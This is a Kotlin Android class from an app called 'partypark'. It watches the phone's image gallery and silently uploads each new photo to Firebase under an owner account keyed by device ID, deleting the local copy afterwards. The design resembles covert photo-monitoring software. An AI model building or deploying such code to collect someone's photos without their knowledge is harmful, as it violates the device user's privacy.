package com.partypark.app

import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.ktx.storage
import java.io.File
import java.io.FileOutputStream

class MediaWatcher(private val context: Context) {

    private val prefs = context.getSharedPreferences("partypark", Context.MODE_PRIVATE)
    private val storage = Firebase.storage.reference
    private val database = Firebase.database.reference
    private val processedIds = mutableSetOf<String>()
    private var observer: ContentObserver? = null

    fun start() {
        if (observer != null) return

        val installTime = prefs.getLong("installTime", 0L).let {
            if (it == 0L) {
                val now = System.currentTimeMillis()
                prefs.edit().putLong("installTime", now).apply()
                now
            } else it
        }

        observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                handleMediaChange()
            }
        }

        context.contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            observer!!
        )

        Log.d("MediaWatcher", "Started. Install watermark: $installTime")
    }

    fun stop() {
        observer?.let { context.contentResolver.unregisterContentObserver(it) }
        observer = null
    }

    private fun handleMediaChange() {
        val ownerUid = prefs.getString("ownerUid", null) ?: return
        val deviceId = prefs.getString("deviceId", null) ?: return
        val installTime = prefs.getLong("installTime", 0L)

        Thread {
            try {
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.DATA
                )

                context.contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    "${MediaStore.Images.Media.DATE_ADDED} > ?",
                    arrayOf((installTime / 1000).toString()),
                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                )?.use { cursor ->
                    val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                    val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    val dataCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)

                    while (cursor.moveToNext()) {
                        val id = cursor.getLong(idCol).toString()
                        if (processedIds.contains(id)) continue

                        val name = cursor.getString(nameCol) ?: "photo_$id.jpg"
                        val size = cursor.getLong(sizeCol)
                        val date = cursor.getLong(dateCol) * 1000
                        val path = cursor.getString(dataCol) ?: continue

                        processedIds.add(id)
                        copyAndUpload(ownerUid, deviceId, id, name, size, date, path)
                    }
                }
            } catch (e: Exception) {
                Log.e("MediaWatcher", "Query failed", e)
            }
        }.start()
    }

    private fun copyAndUpload(ownerUid: String, deviceId: String, id: String, name: String, size: Long, date: Long, sourcePath: String) {
        try {
            val source = File(sourcePath)
            if (!source.exists()) {
                Thread.sleep(500)
                if (!source.exists()) return
            }

            val privateDir = File(context.filesDir, "backup")
            if (!privateDir.exists()) privateDir.mkdirs()

            val dest = File(privateDir, "${id}_$name")
            source.inputStream().use { input ->
                FileOutputStream(dest).use { output -> input.copyTo(output) }
            }

            val thumbPath = "media/$deviceId/new/${id}_$name"
            val thumbRef = storage.child(thumbPath)

            thumbRef.putFile(android.net.Uri.fromFile(dest))
                .continueWithTask { task ->
                    if (!task.isSuccessful) throw task.exception!!
                    thumbRef.downloadUrl
                }
                .addOnSuccessListener { uri ->
                    val data = mapOf(
                        "id" to "new_$id",
                        "name" to name,
                        "type" to "image",
                        "size" to size,
                        "date" to date,
                        "thumbnail" to uri.toString(),
                        "uploadedAt" to System.currentTimeMillis()
                    )
                    database.child("users").child(ownerUid).child("devices").child(deviceId)
                        .child("media").child("new_$id").setValue(data)
                        .addOnSuccessListener {
                            dest.delete()
                            Log.d("MediaWatcher", "Uploaded and cleaned: $name")
                        }
                }
                .addOnFailureListener { e ->
                    Log.e("MediaWatcher", "Upload failed for $name", e)
                }

        } catch (e: Exception) {
            Log.e("MediaWatcher", "Copy/upload failed", e)
        }
    }
}